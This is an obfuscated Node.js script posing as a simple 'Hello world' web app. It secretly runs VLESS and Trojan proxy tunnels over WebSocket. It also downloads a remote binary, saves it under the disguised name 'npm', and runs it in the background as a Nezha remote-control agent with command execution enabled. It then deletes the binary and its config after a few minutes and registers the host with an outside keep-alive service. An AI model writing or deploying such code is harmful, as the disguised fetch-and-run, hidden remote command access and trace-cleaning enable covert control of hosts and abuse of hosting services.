const _0x37955f=_0x15a2;(function(_0x51e040,_0x518584){const _0x2ef590=_0x15a2,_0x436071=_0x51e040();while(!![]){try{const _0x20aa27=parseInt(_0x2ef590(0xf4))/0x1*(-parseInt(_0x2ef590(0xfa))/0x2)+-parseInt(_0x2ef590(0x106))/0x3*(parseInt(_0x2ef590(0xfb))/0x4)+-parseInt(_0x2ef590(0x98))/0x5+-parseInt(_0x2ef590(0xc8))/0x6*(-parseInt(_0x2ef590(0xcb))/0x7)+parseInt(_0x2ef590(0xf3))/0x8+-parseInt(_0x2ef590(0x103))/0x9*(-parseInt(_0x2ef590(0x113))/0xa)+parseInt(_0x2ef590(0xd8))/0xb;if(_0x20aa27===_0x518584)break;else _0x436071['push'](_0x436071['shift']());}catch(_0x130a84){_0x436071['push'](_0x436071['shift']());}}}(_0x2800,0x6cdaa));const os=require('os'),http=require(_0x37955f(0xa4)),fs=require('fs'),axios=require('axios'),net=require(_0x37955f(0x10a)),path=require(_0x37955f(0xff)),crypto=require('crypto'),{Buffer}=require(_0x37955f(0x9d)),{exec,execSync}=require(_0x37955f(0xd3)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x37955f(0xb5)][_0x37955f(0x9c)]||_0x37955f(0x110),NEZHA_SERVER=process[_0x37955f(0xb5)][_0x37955f(0xe3)]||'',NEZHA_PORT=process[_0x37955f(0xb5)][_0x37955f(0xd5)]||'',NEZHA_KEY=process['env'][_0x37955f(0x104)]||'',DOMAIN=process[_0x37955f(0xb5)]['DOMAIN']||_0x37955f(0xdd),AUTO_ACCESS=process[_0x37955f(0xb5)]['AUTO_ACCESS']||!![],WSPATH=process[_0x37955f(0xb5)]['WSPATH']||UUID[_0x37955f(0xbe)](0x0,0x8),SUB_PATH=process[_0x37955f(0xb5)][_0x37955f(0x101)]||'sub',NAME=process[_0x37955f(0xb5)][_0x37955f(0xc2)]||_0x37955f(0x97),PORT=process[_0x37955f(0xb5)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x58a6ac=_0x37955f;try{const _0x52d5be=await axios[_0x58a6ac(0x9a)](_0x58a6ac(0xd7)),_0x2c0004=_0x52d5be['data'];ISP=(_0x2c0004[_0x58a6ac(0x10b)]+'-'+_0x2c0004[_0x58a6ac(0xc9)])['replace'](/ /g,'_');}catch(_0x2ccec1){ISP='Unknown';}};GetISP();const httpServer=http[_0x37955f(0xfd)]((_0x51267e,_0x27cf91)=>{const _0x109e22=_0x37955f;if(_0x51267e['url']==='/'){const _0x2e6c3a=path[_0x109e22(0xf0)](__dirname,_0x109e22(0xb3));fs[_0x109e22(0xb0)](_0x2e6c3a,_0x109e22(0xa0),(_0x553fe0,_0x1a63d2)=>{const _0x297dd5=_0x109e22;if(_0x553fe0){_0x27cf91[_0x297dd5(0xe5)](0xc8,{'Content-Type':_0x297dd5(0xf2)}),_0x27cf91[_0x297dd5(0x107)](_0x297dd5(0xf1));return;}_0x27cf91[_0x297dd5(0xe5)](0xc8,{'Content-Type':'text/html'}),_0x27cf91[_0x297dd5(0x107)](_0x1a63d2);});return;}else{if(_0x51267e[_0x109e22(0xdb)]==='/'+SUB_PATH){const _0x4651b2=_0x109e22(0xec)+UUID+'@'+DOMAIN+_0x109e22(0x108)+DOMAIN+_0x109e22(0xf5)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0xacb8d7=_0x109e22(0xac)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x109e22(0xf5)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x33b527=_0x4651b2+'\x0a'+_0xacb8d7,_0x33a140=Buffer[_0x109e22(0xa6)](_0x33b527)[_0x109e22(0xe0)](_0x109e22(0xbb));_0x27cf91[_0x109e22(0xe5)](0xc8,{'Content-Type':_0x109e22(0x10e)}),_0x27cf91[_0x109e22(0x107)](_0x33a140+'\x0a');}else _0x27cf91['writeHead'](0x194,{'Content-Type':_0x109e22(0x10e)}),_0x27cf91[_0x109e22(0x107)](_0x109e22(0xa7));}}),wss=new WebSocket[(_0x37955f(0xa2))]({'server':httpServer}),uuid=UUID[_0x37955f(0xeb)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0xc80bc4){return new Promise((_0x98639e,_0x340fd9)=>{const _0x4b7e21=_0x15a2;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4b7e21(0xab)](_0xc80bc4)){_0x98639e(_0xc80bc4);return;}let _0x19104f=0x0;function _0x2c01aa(){const _0x551229=_0x4b7e21;if(_0x19104f>=DNS_SERVERS[_0x551229(0xc7)]){_0x340fd9(new Error(_0x551229(0xcc)+_0xc80bc4+_0x551229(0xb9)));return;}const _0x34259d=DNS_SERVERS[_0x19104f];_0x19104f++;const _0x5a118a=_0x551229(0xb4)+encodeURIComponent(_0xc80bc4)+_0x551229(0xbf);axios[_0x551229(0x9a)](_0x5a118a,{'timeout':0x1388,'headers':{'Accept':_0x551229(0x114)}})[_0x551229(0x96)](_0xba3429=>{const _0xcde66e=_0x551229,_0x39b081=_0xba3429[_0xcde66e(0xf8)];if(_0x39b081[_0xcde66e(0xd0)]===0x0&&_0x39b081[_0xcde66e(0x10f)]&&_0x39b081['Answer'][_0xcde66e(0xc7)]>0x0){const _0x30a75d=_0x39b081['Answer'][_0xcde66e(0xee)](_0x11d8d7=>_0x11d8d7[_0xcde66e(0xd1)]===0x1);if(_0x30a75d){_0x98639e(_0x30a75d['data']);return;}}_0x2c01aa();})[_0x551229(0xd9)](_0x126376=>{_0x2c01aa();});}_0x2c01aa();});}function handleVlessConnection(_0x46f440,_0x314672){const _0x17b090=_0x37955f,[_0x4154b1]=_0x314672,_0x535ac5=_0x314672[_0x17b090(0xbe)](0x1,0x11);if(!_0x535ac5['every']((_0x8d4dd9,_0x2c6bcb)=>_0x8d4dd9==parseInt(uuid[_0x17b090(0xc6)](_0x2c6bcb*0x2,0x2),0x10)))return![];let _0x28b3fc=_0x314672[_0x17b090(0xbe)](0x11,0x12)[_0x17b090(0xf6)]()+0x13;const _0x213820=_0x314672[_0x17b090(0xbe)](_0x28b3fc,_0x28b3fc+=0x2)[_0x17b090(0xa9)](0x0),_0x263a82=_0x314672[_0x17b090(0xbe)](_0x28b3fc,_0x28b3fc+=0x1)[_0x17b090(0xf6)](),_0x19c05b=_0x263a82==0x1?_0x314672[_0x17b090(0xbe)](_0x28b3fc,_0x28b3fc+=0x4)[_0x17b090(0xf0)]('.'):_0x263a82==0x2?new TextDecoder()[_0x17b090(0x100)](_0x314672['slice'](_0x28b3fc+0x1,_0x28b3fc+=0x1+_0x314672[_0x17b090(0xbe)](_0x28b3fc,_0x28b3fc+0x1)[_0x17b090(0xf6)]())):_0x263a82==0x3?_0x314672['slice'](_0x28b3fc,_0x28b3fc+=0x10)['reduce']((_0x39f106,_0x1ecf65,_0x970523,_0x364b0c)=>_0x970523%0x2?_0x39f106['concat'](_0x364b0c[_0x17b090(0xbe)](_0x970523-0x1,_0x970523+0x1)):_0x39f106,[])['map'](_0x30160e=>_0x30160e[_0x17b090(0xa9)](0x0)['toString'](0x10))[_0x17b090(0xf0)](':'):'';_0x46f440[_0x17b090(0xaf)](new Uint8Array([_0x4154b1,0x0]));const _0x2658b8=createWebSocketStream(_0x46f440);return resolveHost(_0x19c05b)[_0x17b090(0x96)](_0x444222=>{const _0x5e5209=_0x17b090;net['connect']({'host':_0x444222,'port':_0x213820},function(){const _0x5ad77e=_0x15a2;this[_0x5ad77e(0xda)](_0x314672[_0x5ad77e(0xbe)](_0x28b3fc)),_0x2658b8['on'](_0x5ad77e(0xe6),()=>{})[_0x5ad77e(0x10c)](this)['on'](_0x5ad77e(0xe6),()=>{})[_0x5ad77e(0x10c)](_0x2658b8);})['on'](_0x5e5209(0xe6),()=>{});})[_0x17b090(0xd9)](_0x3149ad=>{const _0x1a0369=_0x17b090;net['connect']({'host':_0x19c05b,'port':_0x213820},function(){const _0x47526d=_0x15a2;this[_0x47526d(0xda)](_0x314672['slice'](_0x28b3fc)),_0x2658b8['on'](_0x47526d(0xe6),()=>{})[_0x47526d(0x10c)](this)['on'](_0x47526d(0xe6),()=>{})[_0x47526d(0x10c)](_0x2658b8);})['on'](_0x1a0369(0xe6),()=>{});}),!![];}function handleTrojanConnection(_0x24477c,_0x3661e4){const _0x176d58=_0x37955f;try{if(_0x3661e4[_0x176d58(0xc7)]<0x3a)return![];const _0xc04785=_0x3661e4[_0x176d58(0xbe)](0x0,0x38)['toString'](),_0x44d88a=[UUID];let _0x12c5f6=null;for(const _0x8ea56a of _0x44d88a){const _0x18ae24=crypto[_0x176d58(0xc1)]('sha224')['update'](_0x8ea56a)['digest'](_0x176d58(0xad));if(_0x18ae24===_0xc04785){_0x12c5f6=_0x8ea56a;break;}}if(!_0x12c5f6)return![];let _0x2c8935=0x38;_0x3661e4[_0x2c8935]===0xd&&_0x3661e4[_0x2c8935+0x1]===0xa&&(_0x2c8935+=0x2);const _0x15dcab=_0x3661e4[_0x2c8935];if(_0x15dcab!==0x1)return![];_0x2c8935+=0x1;const _0x327397=_0x3661e4[_0x2c8935];_0x2c8935+=0x1;let _0x1bcb20,_0x154721;if(_0x327397===0x1)_0x1bcb20=_0x3661e4[_0x176d58(0xbe)](_0x2c8935,_0x2c8935+0x4)[_0x176d58(0xf0)]('.'),_0x2c8935+=0x4;else{if(_0x327397===0x3){const _0x4f1238=_0x3661e4[_0x2c8935];_0x2c8935+=0x1,_0x1bcb20=_0x3661e4['slice'](_0x2c8935,_0x2c8935+_0x4f1238)[_0x176d58(0xe0)](),_0x2c8935+=_0x4f1238;}else{if(_0x327397===0x4)_0x1bcb20=_0x3661e4[_0x176d58(0xbe)](_0x2c8935,_0x2c8935+0x10)[_0x176d58(0xb7)]((_0x2a5c6f,_0x3bfd6f,_0x3c3af0,_0x1b9663)=>_0x3c3af0%0x2?_0x2a5c6f[_0x176d58(0xed)](_0x1b9663[_0x176d58(0xbe)](_0x3c3af0-0x1,_0x3c3af0+0x1)):_0x2a5c6f,[])['map'](_0xf1371c=>_0xf1371c[_0x176d58(0xa9)](0x0)[_0x176d58(0xe0)](0x10))[_0x176d58(0xf0)](':'),_0x2c8935+=0x10;else return![];}}_0x154721=_0x3661e4['readUInt16BE'](_0x2c8935),_0x2c8935+=0x2;_0x2c8935<_0x3661e4['length']&&_0x3661e4[_0x2c8935]===0xd&&_0x3661e4[_0x2c8935+0x1]===0xa&&(_0x2c8935+=0x2);const _0x2f60d2=createWebSocketStream(_0x24477c);return resolveHost(_0x1bcb20)[_0x176d58(0x96)](_0x4dbb34=>{const _0x1cfd6f=_0x176d58;net[_0x1cfd6f(0x105)]({'host':_0x4dbb34,'port':_0x154721},function(){const _0x381d71=_0x1cfd6f;_0x2c8935<_0x3661e4[_0x381d71(0xc7)]&&this[_0x381d71(0xda)](_0x3661e4[_0x381d71(0xbe)](_0x2c8935)),_0x2f60d2['on'](_0x381d71(0xe6),()=>{})['pipe'](this)['on'](_0x381d71(0xe6),()=>{})[_0x381d71(0x10c)](_0x2f60d2);})['on'](_0x1cfd6f(0xe6),()=>{});})[_0x176d58(0xd9)](_0x2754ee=>{const _0x3c83b4=_0x176d58;net[_0x3c83b4(0x105)]({'host':_0x1bcb20,'port':_0x154721},function(){const _0x3adfd3=_0x3c83b4;_0x2c8935<_0x3661e4[_0x3adfd3(0xc7)]&&this['write'](_0x3661e4['slice'](_0x2c8935)),_0x2f60d2['on'](_0x3adfd3(0xe6),()=>{})[_0x3adfd3(0x10c)](this)['on'](_0x3adfd3(0xe6),()=>{})['pipe'](_0x2f60d2);})['on'](_0x3c83b4(0xe6),()=>{});}),!![];}catch(_0x4c4e58){return![];}}wss['on'](_0x37955f(0xae),(_0x10447d,_0x838f76)=>{const _0x4eef9f=_0x37955f,_0x302a42=_0x838f76[_0x4eef9f(0xdb)]||'';_0x10447d[_0x4eef9f(0x102)](_0x4eef9f(0xb8),_0x11f814=>{const _0x323a8a=_0x4eef9f;if(_0x11f814[_0x323a8a(0xc7)]>0x11&&_0x11f814[0x0]===0x0){const _0x5ac7b0=_0x11f814[_0x323a8a(0xbe)](0x1,0x11),_0x51c271=_0x5ac7b0[_0x323a8a(0x112)]((_0x2a1aa4,_0x4c7094)=>_0x2a1aa4==parseInt(uuid[_0x323a8a(0xc6)](_0x4c7094*0x2,0x2),0x10));if(_0x51c271){!handleVlessConnection(_0x10447d,_0x11f814)&&_0x10447d[_0x323a8a(0x10d)]();return;}}!handleTrojanConnection(_0x10447d,_0x11f814)&&_0x10447d[_0x323a8a(0x10d)]();})['on'](_0x4eef9f(0xe6),()=>{});});const getDownloadUrl=()=>{const _0x1b19fe=_0x37955f,_0x34f8c8=os[_0x1b19fe(0xfe)]();return _0x34f8c8===_0x1b19fe(0xcf)||_0x34f8c8==='arm64'||_0x34f8c8===_0x1b19fe(0xfc)?!NEZHA_PORT?_0x1b19fe(0xdf):_0x1b19fe(0xce):!NEZHA_PORT?_0x1b19fe(0xc0):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x10c705=_0x37955f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x738b6d=getDownloadUrl(),_0x1d0989=await axios({'method':_0x10c705(0x9a),'url':_0x738b6d,'responseType':_0x10c705(0xf9)}),_0x5af4c9=fs[_0x10c705(0xe7)](_0x10c705(0x9b));return _0x1d0989[_0x10c705(0xf8)][_0x10c705(0x10c)](_0x5af4c9),new Promise((_0x5bba29,_0x55bf4b)=>{_0x5af4c9['on']('finish',()=>{const _0x249e5e=_0x15a2;console[_0x249e5e(0xe8)](_0x249e5e(0xdc)),exec('chmod\x20+x\x20npm',_0x11e817=>{if(_0x11e817)_0x55bf4b(_0x11e817);_0x5bba29();});}),_0x5af4c9['on']('error',_0x55bf4b);});}catch(_0x1aec5e){throw _0x1aec5e;}},runnz=async()=>{const _0x2b3d36=_0x37955f;try{const _0x3e6c0a=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2b3d36(0xe2)});if(_0x3e6c0a[_0x2b3d36(0xc3)]()!==''){console[_0x2b3d36(0xe8)](_0x2b3d36(0xca));return;}}catch(_0x2578cd){}await downloadFile();let _0x265168='',_0x3b4a02=[_0x2b3d36(0xbc),_0x2b3d36(0xa3),_0x2b3d36(0xd6),'2087',_0x2b3d36(0xba),_0x2b3d36(0xf7)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x439ffe=_0x3b4a02['includes'](NEZHA_PORT)?_0x2b3d36(0xbd):'';_0x265168=_0x2b3d36(0x9f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2b3d36(0xea)+NEZHA_KEY+'\x20'+_0x439ffe+_0x2b3d36(0xde);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x44d780=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x2b3d36(0xa5)]():'',_0x1d8e67=_0x3b4a02[_0x2b3d36(0xe9)](_0x44d780)?_0x2b3d36(0xef):_0x2b3d36(0xa8),_0x2e46f8=_0x2b3d36(0x111)+NEZHA_KEY+_0x2b3d36(0xb2)+NEZHA_SERVER+_0x2b3d36(0xd2)+_0x1d8e67+_0x2b3d36(0xb6)+UUID;fs[_0x2b3d36(0x9e)]('config.yaml',_0x2e46f8);}_0x265168=_0x2b3d36(0xaa);}else{console[_0x2b3d36(0xe8)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x265168,{'shell':'/bin/bash'},_0x45e17e=>{const _0x36a5cd=_0x2b3d36;if(_0x45e17e)console[_0x36a5cd(0xe6)]('npm\x20running\x20error:',_0x45e17e);else console['log'](_0x36a5cd(0xc5));});}catch(_0x28e95c){console[_0x2b3d36(0xe6)]('error:\x20'+_0x28e95c);}};async function addAccessTask(){const _0x3bab28=_0x37955f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xe512bd=_0x3bab28(0xb1)+DOMAIN;try{const _0x574ba9=await axios[_0x3bab28(0xa1)](_0x3bab28(0x109),{'url':_0xe512bd},{'headers':{'Content-Type':_0x3bab28(0xe4)}});console[_0x3bab28(0xe8)](_0x3bab28(0xcd));}catch(_0x2ef0a2){}}function _0x15a2(_0x66c4f6,_0x4aad80){const _0x280033=_0x2800();return _0x15a2=function(_0x15a2bc,_0x58f2fe){_0x15a2bc=_0x15a2bc-0x96;let _0x1e6de6=_0x280033[_0x15a2bc];return _0x1e6de6;},_0x15a2(_0x66c4f6,_0x4aad80);}const delFiles=()=>{const _0x1da813=_0x37955f;fs[_0x1da813(0xe1)](_0x1da813(0x9b),()=>{}),fs[_0x1da813(0xe1)](_0x1da813(0xd4),()=>{});};httpServer[_0x37955f(0xc4)](PORT,()=>{const _0x3f9ba8=_0x37955f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3f9ba8(0xe8)](_0x3f9ba8(0x99)+PORT);});function _0x2800(){const _0x5ada87=['4952160gbaRPY','180119LThBeR','&fp=chrome&type=ws&host=','readUInt8','2053','data','stream','6xmpEHo','4dSOIaW','aarch64','createServer','arch','path','decode','SUB_PATH','once','18WwIkDS','NEZHA_KEY','connect','2468805oJfnPX','end',':443?encryption=none&security=tls&sni=','https://oooo.serv00.net/add-url','net','country','pipe','close','text/plain','Answer','a61a54cb-26ac-4a5a-8b60-57d8eafa320a','client_secret:\x20','every','2877310uOAcgN','application/dns-json','then','Hug','1820615EDajHI','Server\x20is\x20running\x20on\x20port\x20','get','npm','UUID','buffer','writeFileSync','setsid\x20nohup\x20./npm\x20-s\x20','utf8','post','Server','8443','http','pop','from','Not\x20Found\x0a','false','readUInt16BE','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','test','trojan://','hex','connection','send','readFile','https://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','index.html','https://dns.google/resolve?name=','env','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','reduce','message','\x20with\x20all\x20DNS\x20servers','2083','base64','443','--tls','slice','&type=A','https://amd64.ssss.nyc.mn/v1','createHash','NAME','trim','listen','npm\x20is\x20running','substr','length','2639604KMFPaY','asOrganization','npm\x20is\x20already\x20running,\x20skip\x20running...','7IRsIPD','Failed\x20to\x20resolve\x20','Automatic\x20Access\x20Task\x20added\x20successfully','https://arm64.ssss.nyc.mn/agent','arm','Status','type','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','child_process','config.yaml','NEZHA_PORT','2096','https://speed.cloudflare.com/meta','5927515OkHhGC','catch','write','url','npm\x20download\x20successfully','1234.abc.com','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/v1','toString','unlink','utf-8','NEZHA_SERVER','application/json','writeHead','error','createWriteStream','log','includes','\x20-p\x20','replace','vless://','concat','find','true','join','Hello\x20world!','text/html'];_0x2800=function(){return _0x5ada87;};return _0x2800();}
